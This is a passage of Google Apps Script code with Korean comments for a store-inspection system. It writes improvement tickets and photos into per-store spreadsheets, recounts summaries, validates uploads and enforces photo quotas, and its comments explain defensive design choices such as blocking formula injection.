       올렸을 때 옛 파일은 이미 휴지통에 있는데 저장은 BAD_REQUEST로 되돌아가고 O열에는 그
       사라진 파일을 가리키는 =IMAGE() 수식이 남는다. 매장에서 보기에는 "사진이 없어졌는데
       저장은 실패했다"가 된다. */
    let photoCell = null;   // null이면 O열을 건드리지 않는다
    const wantPhoto = payload.photo && payload.photo.dataUrl;
    if (wantPhoto) {
      const saved = saveImprovePhoto(store, ym, no, payload.photo, ctx);
      if (!saved.ok) return err('BAD_REQUEST', saved.error);
      /* ★셀 내 이미지로 넣는다★ — 종전에는 =IMAGE() 수식이었다. 매장이 시트를 직접 열어
         쓰는 일이 있는데, 수식은 실수로 지워지거나 앞에 글자가 붙으면 그대로 깨진다.
         셀 값이면 그런 일이 없고 모바일 시트 앱에서도 그대로 보인다. */
      photoCell = PHOTO_EMBED ? cellImageOf(saved.id, '개선 후 사진') : saved.url;
    } else if (payload.clearPhoto) {
      photoCell = '';
    }
    if (photoCell !== null) {
      const olds = photoIdsOf(curV[5], curF[5]);
      for (let i = 0; i < olds.length; i++) {
        try { DriveApp.getFileById(olds[i]).setTrashed(true); } catch (e) { }
      }
    }

    // K·L·M·N — 시트에 쓰는 모든 문자열은 safe()를 통과한다
    const wRng = grid(sh, r, 11, 1, 4);
    if (!wRng || wRng.getNumColumns() < 4) return err('SERVER_ERROR', '이 월 탭에는 담당부서~완료 칸이 없습니다. 담당자에게 문의해 주세요.');
    wRng.setValues([safeRow([texts.dept, texts.owner, texts.plan, texts.doneNote])]);
    if (photoCell !== null) {
      const oRng = grid(sh, r, 15, 1, 1);
      if (oRng) oRng.setValue(photoCell);
    }

    // 재읽기해서 rev·item 구성 — ★쓴 값으로 계산하면 안 된다★ (safe()의 아포스트로피 때문)
    const after = grid(sh, r, 10, 1, 6);
    const aV = after.getValues()[0];
    const aF = after.getFormulas()[0];
    const item = itemOf(no, aV, aF, tz, ym);

    const summary = recountSummary(sh, tz);
    try {
      CacheService.getScriptCache().remove('store:v' + epoch() + ':' + store + ':' + ym);
    } catch (e) { }
    dropStoreCache(store, ym);   // 저장 직후 조회가 직전 값을 보여주지 않게
    return { ok: true, item: item, summary: summary };
  } finally {
    try { lock.releaseLock(); } catch (e) { }
  }
}

function capText(v) { return String(v == null ? '' : v); }

/* 저장·CONFLICT 응답에 담는 항목 1건.
   ★store.get의 items[]와 같은 칸을 담아야 한다★ — 종전에는 8칸뿐이라 due·overdue·isNew가
   빠졌고, 화면이 저장 성공 후 이 객체로 카드를 다시 그리면서 ①아직 기한이 지난 항목인데
   '지연 ⚠'과 빨간 선이 사라지고 ②요약·하단바의 '지연 n건'이 실제보다 적게 나왔다.
   (완료 처리한 경우에만 우연히 맞았다.)
   ym이 필요한 이유는 dueDateOf가 '연도 없는 예정일'을 탭 월 기준으로 해석하기 때문이다.
   ★cat·text·beforePhotos(B~D열)는 담지 않는다★ — 이 함수가 받는 것은 J~O 6칸이고, 그 칸들은
   본사 몫이라 저장으로 바뀌지 않는다. 화면이 '서버가 보낸 칸만' 덮어쓰므로 직전 값이 남는다. */
function itemOf(no, v /* J~O */, f, tz, ym) {
  const doneNote = String(cell(v[4], tz) == null ? '' : cell(v[4], tz)).trim();
  const due = dueDateOf(v[3], tz, ym);
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  const overdue = !!(due && !doneNote && due < today);
  return {
    no: no,
    text: String(v[0] == null ? '' : v[0]).trim(),   // J열 — 이 6칸 안에 있으므로 함께 준다
    dept: String(v[1] == null ? '' : v[1]).trim(),
    owner: String(v[2] == null ? '' : v[2]).trim(),
    plan: String(cell(v[3], tz) == null ? '' : cell(v[3], tz)).trim(),
    doneNote: doneNote,
    afterPhoto: (function () { const u = photoUrlsOf(v[5], f[5]); return u.length ? u[0] : null; })(),
    state: stateOf(v[3], v[4]),
    due: due || null,
    overdue: overdue,
    overdueDays: overdue ? daysBetween(due, today) : 0,
    /* ★isNew는 항상 false★ — 방금 자기가 저장한 항목이 'NEW'일 리 없고, 남겨 두면 화면이
       직전 값(true)을 그대로 유지해 저장 후에도 NEW 뱃지가 계속 붙는다. */
    isNew: false,
    rev: revOf(no, v, f)
  };
}

/* 요약 재집계. ★I9(개선율)는 수식이므로 절대 쓰지 않는다★.
   I5~I8이 수식이면 건드리지 않고, 수기면 서버가 세어 다시 쓴다. */
function recountSummary(sh, tz) {
  const endRow2 = tableEndRow(sh);   // 표 끝 아래의 안내문까지 세지 않는다
  const rng = grid(sh, 12, 2, endRow2 ? Math.max(0, endRow2 - 11) : 200, 14);
  const vals = rng ? rng.getValues() : [];
  let req = 0, prog = 0, done = 0;
  for (let i = 0; i < vals.length; i++) {
    if (!String(vals[i][8] == null ? '' : vals[i][8]).trim()) continue;   // J열
    req++;
    const s = stateOf(vals[i][11], vals[i][12]);
    if (s === '완료') done++;
    else if (s === '진행') prog++;
  }
  const todo = req - done - prog;
  const lm = labelMap(sh);
  writeCount(sh, lm, ['개선요청', '요청', '요청건수', '개선요청건수'], req);
  writeCount(sh, lm, ['진행', '개선진행', '진행중', '개선예정'], prog);
  writeCount(sh, lm, ['완료', '조치완료', '개선완료'], done);
  writeCount(sh, lm, ['미조치', '미이행'], todo);
  return { req: req, prog: prog, done: done, todo: todo, rate: req > 0 ? Math.round((done / req) * 100) / 100 : null };
}

function writeCount(sh, lm, names, n) {
  const p = labelValue(lm, names);
  if (!p.found || !p.row) return;
  try {
    const cellRng = grid(sh, p.row, p.col, 1, 1);
    if (!cellRng) return;
    if (String(cellRng.getFormula() || '') !== '') return;   // 수식이면 건드리지 않는다
    cellRng.setValue(n);
  } catch (e) { /* 보호된 범위일 수 있다 — 요약 갱신 실패가 저장을 되돌릴 이유는 없다 */ }
}

/* ---------- ③ 매장별 QSC현황 파일 ---------- */

// 매장 파일 주소는 통합시트 D열 매장명 셀에 걸린 하이퍼링크에서 그대로 뽑는다.
// (관리자가 이미 매장별 시트 링크를 걸어두고 쓰던 구조 — 별도 매핑 탭이 필요 없다.
//  매장이 바뀌어도 링크만 걸면 앱이 자동으로 따라간다.)
// 클라이언트가 파일 ID·URL·시트 ID를 보내는 경로는 만들지 않는다 (§8-3 방어②).
function storeFileId(store) {
  const key = normStore(store);
  const ck = 'sfid:v' + epoch() + ':' + key;
  const cache = CacheService.getScriptCache();
  const hit = cache.get(ck);
  if (hit) return hit === '-' ? null : hit;
  const found = storeFileIdRaw(key);
  cache.put(ck, found || '-', 3600);
  return found;
}

function storeFileIdRaw(key) {
  const sh = SpreadsheetApp.openById(DASHBOARD_ID).getSheetByName(DASHBOARD_SHEET);
  const last = sh.getLastRow();
  if (last < 6) return storeFileIdFromMap(key);
  const rng = grid(sh, 6, STORE_NAME_COL, last - 5, 1); // D6부터 매장명
  if (!rng) return storeFileIdFromMap(key);
  const names = rng.getValues();
  const rich = rng.getRichTextValues();
  const fmls = rng.getFormulas();
  for (let i = 0; i < names.length; i++) {
    if (normStore(names[i][0]) !== key) continue;
    const rt = rich[i][0];
    let url = rt ? rt.getLinkUrl() : null;
    if (!url && rt) { // 셀 일부에만 링크가 걸린 경우
      const runs = rt.getRuns();
      for (let k = 0; k < runs.length && !url; k++) url = runs[k].getLinkUrl();
    }
    /* 하이퍼링크가 =HYPERLINK() 수식이면 getRichTextValues().getLinkUrl()이 null이다 (§9-9-3) */
    if (!url) {
      const fm = String(fmls[i][0] || '').match(/HYPERLINK\(\s*"([^"]+)"/i);
      if (fm) url = fm[1];
    }
    const m = url ? String(url).match(/\/d\/([a-zA-Z0-9_-]{20,})/) : null;
    if (m) return m[1];
    break;
  }
  return storeFileIdFromMap(key); // 링크가 없는 매장만 폴백
}

/* 폴백: '매장파일맵' 탭(A=매장명, B=파일ID).
   인증 시트로 옮겼다 — 통합시트는 보기 전용이라 거기에는 탭을 만들 수 없다(§3-0).
   옛 배치(통합시트 안)도 남아 있을 수 있어 둘 다 본다. */
function storeFileIdFromMap(store) {
  const key = normStore(store);
  const tries = [];
  const a = authSS();
  if (a) tries.push(a);
  try { if (DASHBOARD_ID) tries.push(SpreadsheetApp.openById(DASHBOARD_ID)); } catch (e) { }
  for (let t = 0; t < tries.length; t++) {
    try {
      const sh = tries[t].getSheetByName(STORE_MAP_SHEET);
      if (!sh) continue;
      const vals = sh.getDataRange().getValues();
      for (let i = 0; i < vals.length; i++) {
        if (normStore(vals[i][0]) === key && vals[i][1]) return String(vals[i][1]).trim();
      }
    } catch (e) { }
  }
  return null;
}

function yymm(dateStr) { return dateStr.slice(2, 4) + dateStr.slice(5, 7); } // '2026-08-10' → '2608'

/* 라벨 셀을 찾아 그 오른쪽 칸에 기록 (월 탭 레이아웃이 조금 달라도 동작).
   ★읽기와 같은 스캐너(labelMap, A1:J10)를 쓴다★ — 종전에는 쓰기만 A1:L15를 훑어서 읽기보다
     넓었다. 우측 '차기 월 목표' 표에 '위생점수'가 또 있으면 쓰기는 그쪽(K~L열)에 값을 넣고
     읽기(readStoreTab)는 A1:J10 안의 빈 칸을 읽는다 → 점검자에게는 "저장 완료", 매장 화면
     위생점수는 계속 빈칸. 예외가 안 나므로 아무도 모른다 (§9-7).
   ★병합을 처리한다★ — 라벨 셀이 G5:H5 병합이면 값 칸은 I5인데 종전 코드는 무조건 c+2(H5)를
     노려 병합 내부에 쓰려다 값이 조용히 사라졌다.
   ★safe()를 통과시킨다★ — STORE_FILE_WRITE=true가 되는 날 본사 공용 26개 파일에 수식 주입
     경로가 열리지 않도록 여기 한 곳에서 막는다(숫자 인자는 safe가 그대로 통과시킨다). */
function setByLabel(sh, label, value) {
  const lm = labelMap(sh);
  const at = lm.at[String(label).replace(/\s+/g, '')];
  if (!at) return false;
  const labelCell = grid(sh, at.row, at.col, 1, 1);
  if (!labelCell) return false;
  let col = at.col;
  try {
    const mg = labelCell.getMergedRanges();
    if (mg && mg.length) col = mg[0].getLastColumn();   // 병합의 오른쪽 끝 다음 칸이 값 칸이다
  } catch (e) { }
  let target = grid(sh, at.row, col + 1, 1, 1);
  if (!target) return false;
  try {
    const mg2 = target.getMergedRanges();
    if (mg2 && mg2.length) target = mg2[0].getCell(1, 1);   // 값 칸이 병합이면 좌상단에 쓴다
  } catch (e) { }
  try { target.setValue(safe(value)); } catch (e) { return false; }
  return true;
}

function writeStoreQsc(p, photoMap) {
  const id = storeFileId(p.store);
  if (!id) return { ok: false, error: STORE_MAP_SHEET + '에 매장 없음: ' + p.store };
  return writeStoreQscInto(SpreadsheetApp.openById(id), p, photoMap, yymm(p.date));
}

/* 실제 기록. ★스프레드시트를 인자로 받는다★ — 사본 테스트(testStoreCopy)가 이 함수를
   그대로 타야 "테스트는 통과했는데 실전은 다르더라"가 생기지 않는다.
   여기서 storeFileId를 부르지 않는 것이 그 조건이다. */
function writeStoreQscInto(ss, p, photoMap, tab) {
  photoMap = photoMap || {};
  const sh = ss.getSheetByName(tab);
  if (!sh) return { ok: false, error: '월 탭 없음: ' + tab };

  /* 라벨을 못 찾아도 조용히 "저장 완료"가 뜨면 안 된다 — 반환값을 모아 warn으로 올린다 (§9-7) */
  const warn = [];
  /* ★재제출은 덮어쓴다★ (2026-08-18 사용자 결정)
     종전에는 무조건 이어 붙였다. 그래서 실수로 한 번 더 제출하면 개선요청이 두 벌 쌓이고,
     =COUNTA가 두 벌을 세어 개선율이 반토막 났다.
     '같은 회차인가'는 ★방문일(+방문시간)★로 판정한다 — 한 달에 두 번 점검한 경우는
     날짜가 다르므로 덮어쓰지 않고 종전대로 이어 붙는다.
     ★반드시 setByLabel로 덮어쓰기 전에 읽어야 한다★ — 아래 줄이 방문일을 새 값으로 바꾼다. */
  const prevDate = (function () {
    const lm0 = labelMap(sh);
    const d0 = labelValue(lm0, ['방문일', '방문일자', '점검일', '점검일자']);
    const t0 = labelValue(lm0, ['방문시간']);
    return {
      date: dateOfCell(d0.v, fileTz(ss)),
      time: timeKeyOf(t0.v, fileTz(ss)),
    };
  })();

  if (!setByLabel(sh, '방문일', p.date)) warn.push("'방문일' 라벨을 찾지 못했습니다");
  if (p.time) setByLabel(sh, '방문시간', p.time); // 월 탭에 라벨이 없으면 조용히 건너뜀
  if (p.result.final != null && !setByLabel(sh, '위생점수', p.result.final / 100)) {
    warn.push("'위생점수' 라벨을 찾지 못했습니다");
  }

  // 개선요청 표: B열에서 'NO.' 헤더 행을 찾고, J열 첫 빈 행부터 개선 필요 문항(1건 이상)을 추가
  const found = p.items.filter(function (it) { return typeof it.value === 'number' && it.value >= 1; });
  if (!found.length) return { ok: true, tickets: 0, warn: warn };

  const colBRange = grid(sh, 1, 2, 60, 1);
  const colB = colBRange ? colBRange.getValues() : [];
  let headRow = -1;
  for (let i = 0; i < colB.length; i++) {
    if (String(colB[i][0]).trim().toUpperCase().indexOf('NO') === 0) { headRow = i + 1; break; }
  }
  if (headRow < 0) return { ok: false, error: "개선요청 표 헤더(B열 'NO.')를 못 찾음: " + tab, warn: warn };

  /* ★표의 끝을 시트에서 읽는다★ — 요약의 =COUNTA(J12:J38)이 알려 준다(tableEndRow 주석).
     종전에는 헤더 아래 200줄을 훑고 남은 칸도 sh.getMaxRows()까지로 봤다. 그래서
     ①표 아래 안내문이 '이미 쓴 행'으로 잡혀 그 아래에 이어 쓰고
     ②27건을 넘기면 그 안내문을 덮어썼다. 둘 다 조용히 일어난다. */
  const lastRow = tableEndRow(sh) || sh.getMaxRows();
  const scan = Math.max(0, lastRow - headRow);
  const colJRange = grid(sh, headRow + 1, 10, scan || 200, 1);
  const colJ = colJRange ? colJRange.getValues() : [];
  /* ── 같은 회차 재제출이면 이전 기록을 지우고 새로 쓴다 ─────────────────────
     ★매장이 이미 뭔가 적었으면 절대 지우지 않는다★ — K~O(담당부서·담당자·예정일·완료·사진)는
       매장 몫이다. 본사 몫(B·C·D·J)만 갈아 끼우면 행 번호는 그대로인데 내용이 바뀌어,
       매장이 적어 둔 개선 결과가 ★엉뚱한 지적사항에 붙는다★. 그러면 아무도 눈치채지 못한다.
       그래서 그 경우에는 쓰지 않고 사유를 돌려준다 — 조용히 지우는 것이 가장 나쁘다. */
  let wiped = 0;
  const sameRound = !!(prevDate.date && prevDate.date === dateOfCell(p.date, fileTz(ss)) &&
    (!p.time || !prevDate.time || prevDate.time === timeKeyOf(p.time, fileTz(ss))));
  if (sameRound) {
    const bodyN = Math.max(0, lastRow - headRow);
    const bodyR = grid(sh, headRow + 1, 2, bodyN, 14);   // B~O
    const body = bodyR ? bodyR.getValues() : [];
    let filled = 0, storeTouched = 0;
    for (let i = 0; i < body.length; i++) {
      const hasHq = String(body[i][8] == null ? '' : body[i][8]).trim() !== '';   // J열(본문)
      if (!hasHq) continue;
      filled = i + 1;
      for (let c = 9; c <= 13; c++) {                                             // K~O(매장 몫)
        if (String(body[i][c] == null ? '' : body[i][c]).trim() !== '') { storeTouched++; break; }
      }
    }
    if (storeTouched > 0) {
      return { ok: false,
        error: '같은 방문일(' + prevDate.date + ')로 이미 기록된 개선요청이 있고, 그중 ' + storeTouched +
               '건은 매장이 개선 내용을 이미 적었습니다. 덮어쓰면 매장이 적은 내용이 엉뚱한 항목에 붙으므로 기록하지 않았습니다. ' +
               '시트에서 직접 정리한 뒤 다시 제출해 주세요.',
        warn: warn };
    }
    if (filled > 0) {
      const bcW = grid(sh, headRow + 1, 2, filled, 2);   // B:C
      const dW = grid(sh, headRow + 1, 4, filled, 1);    // D
      const jW = grid(sh, headRow + 1, 10, filled, 1);   // J
      if (bcW) bcW.clearContent();
      if (dW) dW.clearContent();
      if (jW) jW.clearContent();
      wiped = filled;
      warn.push('같은 방문일(' + prevDate.date + ') 재제출이라 이전 기록 ' + wiped + '건을 지우고 새로 기록했습니다');
    }
  }


  const colJv = wiped ? (grid(sh, headRow + 1, 10, scan || 200, 1) || { getValues: function () { return []; } }).getValues() : colJ;
  let used = 0;
  for (let i = 0; i < colJv.length; i++) { if (String(colJv[i][0]).trim() !== '') used = i + 1; }
  const row = headRow + 1 + used;
  let no = used;

  /* 표가 모자라면 예외로 죽는 대신 쓸 수 있는 만큼만 쓰고, ★몇 건을 못 썼는지 반드시 알린다★ —
     조용히 잘리면 점검자는 다 기록된 줄 안다. */
  const room = lastRow - row + 1;
  const list = found.slice(0, Math.max(0, room));
  if (!list.length) return { ok: false, error: '개선요청 표에 빈 행이 없음: ' + tab + ' (표 끝 ' + lastRow + '행)', warn: warn };
  if (list.length < found.length) {
    warn.push('개선요청 ' + found.length + '건 중 ' + list.length + '건만 기록했습니다 — 표(' +
      (headRow + 1) + '~' + lastRow + '행)에 빈 행이 모자랍니다');
  }

  /* ★매장에 가는 것은 '사진 + 개선요청 문장' 둘뿐이다★ (2026-08-20 사용자 결정)

     종전에는 이렇게 썼다:  [★★ 중대] A-05 원산지 표시… (2건)
     여기에는 ★채점 근거가 그대로 들어 있었다★ — 심각도 딱지 · 문항 코드 · 문항 본문 · 건수 ·
     대분류. 매장이 이 한 줄만 보고 "이 문항에서 ★★로 몇 건 걸려 몇 점 깎였구나"를 읽는다.

     ★매장은 QSC 질문지를 알 수 없어야 한다★ — 그래서 전부 뺐다.
     문항 본문도 뺀다(그 자체가 질문지다). 대분류도 뺀다.
     매장이 받는 글은 ★점검자가 그 자리에서 직접 쓴 개선요청 문장 하나★뿐이다.
     그래서 그 문장이 비면 전달이 성립하지 않는다 — 점검 화면이 비운 채로는 제출을 막고,
     그래도 빈 것이 오면 아래에서 눈에 띄게 적어 담당자가 알아채게 한다.

     채점 근거는 전부 `QSC_회차`·`QSC_상세`(개인 계정 응답 원본)에 그대로 남는다.
     매장은 그 파일에 접근 자체가 없다. */
  const bc = [], d = [], j = [], imgCells = [];   // imgCells[i] = 그 행에 넣을 사진 파일 ID ('' = 없음)
  const noText = [];
  list.forEach(function (it) {
    no += 1;
    const photos = photoMap[it.no] || [];
    /* 2번째 이후 사진은 갈 칸이 없다(표가 O열에서 끝남) → 본문 뒤에 붙인다 */
    const tail = photos.length > 1
      ? '\n· 사진 ' + photos.length + '장: ' + photos.map(function (x) { return x.url; }).join(' ')
      : '';
    const body = String(it.memo == null ? '' : it.memo).trim();
    if (!body) noText.push(it.code || ('문항 ' + it.no));
    bc.push([no, '']);   // ★구분(대분류)도 비운다★ — 평가체계의 구조를 드러내지 않는다
    /* ★사진 칸은 여기서 비워 두고 아래에서 따로 넣는다★ — 셀 내 이미지는 setValue로만
       넣는 것이 문서화된 경로다. setValues(2차원 배열)에 객체를 섞는 것은 보장되지 않는다.
       PHOTO_EMBED=false(링크만)이면 종전대로 여기서 문자열로 채운다. */
    d.push([(photos.length && !PHOTO_EMBED) ? photos[0].url : '']);
    imgCells.push(photos.length && PHOTO_EMBED ? photos[0].id : '');
    j.push([safe((body || '(개선요청 내용이 비어 있습니다 — 점검자에게 확인해 주세요)') + tail)]);
  });
  if (noText.length) {
    warn.push('개선요청 문장이 비어 있는 항목이 ' + noText.length + '건입니다 (' +
      noText.slice(0, 5).join(', ') + (noText.length > 5 ? ' 외' : '') +
      ') — 매장에는 그 자리가 빈 채로 전달됩니다. 시트에서 채워 주세요.');
  }

  /* ⚠B~P를 한 번에 쓰면 안 된다. 데이터 행마다 D:I가 병합돼 있어 E~I 값은 조용히 버려지고,
     무엇보다 **O열(매장이 올린 개선 후 사진)이 빈 값으로 덮여 지워진다.**
     범위가 병합을 완전히 포함하면 예외조차 나지 않아 알아채지도 못한다. 그래서 본사 몫인
     B·C / D / J 만 따로 쓰고 매장 몫인 K~O는 절대 건드리지 않는다. */
  /* 행은 위 room으로 클램프했지만 열은 클램프되어 있지 않았다 — 손으로 만든 월 탭의
     getMaxColumns()가 10 미만이면 getRange(row,10,…)에서 §9-1이 막으려던 예외가 그대로 난다.
     grid()로 바꾸고, 못 쓴 칸은 조용히 넘기지 말고 warn에 담는다. */
  const bcR = grid(sh, row, 2, bc.length, 2);
  const dR = grid(sh, row, 4, d.length, 1);
  const jR = grid(sh, row, 10, j.length, 1);
  if (bcR && bcR.getNumColumns() === 2) bcR.setValues(bc); else warn.push('B:C(번호·구분) 칸이 없어 기록하지 못했습니다');
  if (dR) dR.setValues(d); else warn.push('D(사진) 칸이 없어 기록하지 못했습니다');
  /* 사진은 빈 칸으로 한 번 쓴 뒤 한 칸씩 셀 내 이미지로 채운다(cellImageOf 주석 참조).
     한 장이 실패해도 나머지 기록은 남아야 하므로 행마다 따로 감싼다 — 사진은 부가 정보이고
     개선요청 본문이 기록되는 것이 이 함수의 본래 일이다. */
  if (dR) {
    for (let i = 0; i < imgCells.length; i++) {
      if (!imgCells[i]) continue;
      try {
        const img = cellImageOf(imgCells[i], '개선 전 사진');
        if (img) grid(sh, row + i, 4, 1, 1).setValue(img);
      } catch (e) { warn.push((row + i) + '행 사진을 넣지 못했습니다'); }
    }
  }
  if (jR) jR.setValues(j); else warn.push('J(개선요청 내용) 칸이 없어 기록하지 못했습니다');
  return { ok: !!jR, tickets: jR ? list.length : 0, tab: tab, skipped: found.length - list.length, warn: warn };
}

function writeStoreShopper(store, dateStr, frac) {
  const id = storeFileId(store);
  if (!id) return { ok: false, error: STORE_MAP_SHEET + '에 매장 없음: ' + store };
  const sh = SpreadsheetApp.openById(id).getSheetByName(yymm(dateStr));
  if (!sh) return { ok: false, error: '월 탭 없음: ' + yymm(dateStr) };
  /* 라벨을 못 찾았을 때 { ok:false } 만 돌려주면 화면에는 아무것도 안 뜬다(§9-7).
     QSC 쪽과 같은 모양으로 warn을 실어 프론트가 그대로 보여줄 수 있게 한다. */
  if (!setByLabel(sh, 'CS점수', frac)) {
    return { ok: false, error: "'CS점수' 라벨을 찾지 못해 매장 파일에 기록하지 못했습니다.",
      warn: ["'CS점수' 라벨을 찾지 못했습니다"] };
  }
  return { ok: true, warn: [] };
}

/* ---------- 사진 ---------- */

/* 입력 검증 (§8-5): data:image/jpeg|png;base64 로 시작할 때만 허용 · 개당 base64 400KB 이하 */
function validPhoto(dataUrl) {
  const s = String(dataUrl || '');
  if (!/^data:image\/(jpeg|jpg|png);base64,/.test(s)) return '형식이 올바르지 않은 사진입니다.';
  if (s.length > 400 * 1024) return '사진 한 장이 너무 큽니다.';
  return '';
}

/* 계정당 하루 사진 건수 상한. 익명 설문은 사진을 아예 다루지 않으므로 여기까지 오지 않는다.
   ★n장을 한 번에 예약한다★ — 장당 setProperty를 부르면 40장 제출에 속성 쓰기 40회(수 초)가 붙는다.
   전날 키는 그때 함께 지운다. 속성은 durable이라 스스로 사라지지 않아 계정×날짜만큼 쌓인다. */
/* ★1단계에는 토큰이 없어 ctx.id가 전부 '(무인증)'이다★ — 계정별 상한이 그대로 '회사 전체
   하루 200장'이 되어, 40장짜리 점검 5건이면 소진되고 6번째 점검부터 사진 전량이 조용히
   버려진다(응답은 ok:true, 화면은 "저장 완료"). 익명 구간에서는 계정 대신 매장명으로 버킷을
   나눈다 — 매장은 클라이언트가 보내는 값이라 위조할 수 있지만, 여기서 지키려는 것은
   자격증명이 아니라 '한 사람의 사고가 26곳을 멈추지 않게 하는 것'이다. */
/* ★익명 버킷을 PropertiesService에 두면 '방어를 끄는 방어 우회'가 된다★
   종전에는 익명 키가 'PD:무인증:<클라이언트가 보낸 매장명>:<날짜>' 였고, 전날 정리는 ★같은 id의★
   어제 키만 지웠다. 즉 매번 다른 가짜 매장명을 보내면 속성이 영구히 쌓인다. AUTH_ENFORCE='off'
   동안 사진 1장짜리 qsc.submit을 레거시 스로틀 한도로 돌리면 하루 1.4만 개다.
   PropertiesService 총 500KB 한도에 닿는 순간 setProperty가 예외를 던지고, 그때 함께 죽는 것이
   ★lockFail의 PROPS.setProperty('LK:'+id) — 즉 계정 잠금 자체★와 bumpHourly(해시 예산)다.
   그래서 익명 버킷은 CacheService에 두고, 키도 해시로 고정 길이화한다. 익명 매장명은 어차피
   위조 가능한 값이라 durable일 이유가 없다(캐시가 축출되면 상한이 헐거워질 뿐이고,
   그 몫은 anonThrottle·legacyThrottle이 이미 맡고 있다).
   인증 계정은 종전대로 속성에 둔다 — 키가 계정 수만큼으로 닫혀 있고, 날짜가 바뀌면 정리된다. */
function photoQuotaOk(ctx, n, store) {
  const tz = Session.getScriptTimeZone();
  const day = Utilities.formatDate(new Date(), tz, 'yyyyMMdd');
  const max = propN('PHOTO_DAY_MAX', 200);

  if (!(ctx && ctx.auth && ctx.id)) {
    try {
      const cache = CacheService.getScriptCache();
      const k = 'pdq:' + sha256Hex(normStore(store) || '(매장없음)').slice(0, 8) + ':' + day;
      const cur = Number(cache.get(k) || 0);
      if (cur + n > max) return false;
      cache.put(k, String(cur + n), 21600);   // 6시간 (캐시 상한). 날짜가 바뀌면 키 자체가 바뀐다
      return true;
    } catch (e) { return true; }   // 카운터 고장이 현장 제출을 막을 이유는 없다
  }

  const k = 'PD:' + ctx.id + ':' + day;
  const cur = Number(PROPS.getProperty(k) || 0);
  if (cur + n > max) return false;
  PROPS.setProperty(k, String(cur + n));
  if (cur === 0) {
    const y = Utilities.formatDate(new Date(Date.now() - 86400000), tz, 'yyyyMMdd');
    try { PROPS.deleteProperty('PD:' + ctx.id + ':' + y); } catch (e) { }
  }
  return true;
}

function savePhotos(p, ctx) {
  const out = {};
  let skipped = 0;
  if (!PHOTO_FOLDER_ID) return out;
  let dayFolder = null;
  const safeName = fileSafe(p.store);
  // 하루 상한을 한 번에 예약한다 (QSC 40장 상한도 여기서 함께 건다)
  let budget = 0;
  p.items.forEach(function (it) { budget += Math.min(40, (it.photos || []).length); });
  budget = Math.min(budget, 40);
  const quota = budget > 0 ? photoQuotaOk(ctx, budget, p.store) : true;
  if (!quota) { out.__skipped = budget; return out; }
  let used = 0;
  p.items.forEach(function (it) {
    const list = (it.photos || []).slice(0, 40);
    list.forEach(function (dataUrl, i) {
      if (used >= budget) { skipped++; return; }
      if (validPhoto(dataUrl)) { skipped++; return; }
      used++;
      if (!dayFolder) dayFolder = subFolder(subFolder(yearFolder(p.date, 'QSC점검'), safeName), fileSafe(p.date));
      const base64 = dataUrl.split(',')[1];
      const blob = Utilities.newBlob(Utilities.base64Decode(base64), 'image/jpeg',
        fileSafe(p.date) + '_' + safeName + '_문항' + it.no + '_' + (i + 1) + '.jpg');
      const f = dayFolder.createFile(blob);
      if (PHOTO_EMBED) f.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
      (out[it.no] = out[it.no] || []).push({ url: f.getUrl(), id: f.getId() });
    });
  });
  if (skipped) out.__skipped = skipped;
  return out;
}

/* ★영수증 사진 첨부는 2026-08-20에 없앴다★ (사용자 지시 — 없던 것으로).
   `saveReceipts` 와 `SURVEY_PHOTO` 스위치를 함께 지웠다. 쇼퍼·고객 설문은 이제 사진을 다루지 않는다.
   드라이브의 `2026/미스터리쇼퍼/...` 폴더에 옛 영수증이 남아 있으면 사람이 정리한다 —
   코드가 지우지 않는다(지운 뒤 필요해지면 되돌릴 방법이 없다).

   ※한 번만 돌리는 정리 함수. 옛 `쇼퍼_응답` 시트에 남은 '영수증' 열을 없앤다.
     안 돌려도 기록은 어긋나지 않는다(saveShopper가 빈칸으로 맞춘다). */
function dropReceiptColumn() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  const sh = ss.getSheetByName('쇼퍼_응답');
  if (!sh) { const m = '쇼퍼_응답 시트가 없습니다 — 할 일이 없습니다.'; Logger.log(m); return m; }
  const head = sh.getRange(1, 1, 1, Math.max(1, sh.getLastColumn())).getValues()[0].map(String);
  const at = head.indexOf('영수증');
  if (at < 0) { const m = "'영수증' 열이 이미 없습니다."; Logger.log(m); return m; }
  const rows = sh.getLastRow() - 1;
  const used = rows > 0
    ? sh.getRange(2, at + 1, rows, 1).getValues().filter(function (r) { return String(r[0] || '').trim(); }).length
    : 0;
  if (used) {
    const m = '★멈춤★ 그 열에 값이 ' + used + '건 있습니다 (' + (at + 1) + '번째 열). ' +
      '지우면 드라이브 링크가 사라집니다 — 먼저 옮겨 두신 뒤 다시 부르십시오.';
    Logger.log(m); return m;
  }
  sh.deleteColumn(at + 1);
  const m = "'영수증' 열(" + (at + 1) + '번째)을 지웠습니다. 값이 없어 잃은 것은 없습니다.';
  Logger.log(m); return m;
}

// 매장이 올리는 개선 후 사진 (1장)
function saveImprovePhoto(store, ym, no, photo, ctx) {
  if (!PHOTO_FOLDER_ID) return { ok: false, error: '사진 폴더가 설정되지 않았습니다.' };
  const bad = validPhoto(photo.dataUrl);
  if (bad) return { ok: false, error: bad };
  if (!photoQuotaOk(ctx, 1, store)) return { ok: false, error: '오늘 올릴 수 있는 사진 수를 넘었습니다.' };
  const date = '20' + ym.slice(0, 2) + '-' + ym.slice(2, 4) + '-01';
  const safeName = fileSafe(store);
  const dir = subFolder(subFolder(yearFolder(date, '개선보고'), safeName), ym);
  const blob = Utilities.newBlob(Utilities.base64Decode(photo.dataUrl.split(',')[1]), 'image/jpeg',
    ym + '_' + safeName + '_개선' + no + '.jpg');
  const f = dir.createFile(blob);
  if (PHOTO_EMBED) f.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
  return { ok: true, id: f.getId(), url: photoUrl(f.getId()) };
}

/* 파일명에는 영숫자·한글·-·_ 만 남긴다 (§8-5)
   ★NFC 정규화가 먼저다★ — 화이트리스트의 `가-힣`은 완성형이고, NFD 한글의 자모는 U+1100
   블록이라 여기에 없다. 정규화를 빼면 macOS에서 입력된 매장명이 통째로 지워져 사진이 전부
   '무제' 폴더로 들어간다(예외가 안 나므로 연말 정리 때나 발견된다). */
function fileSafe(s) {
  return String(s == null ? '' : s).normalize('NFC')
    .replace(/[^0-9A-Za-z가-힣ㄱ-ㅎㅏ-ㅣ\-_ ]/g, '').trim() || '무제';
}

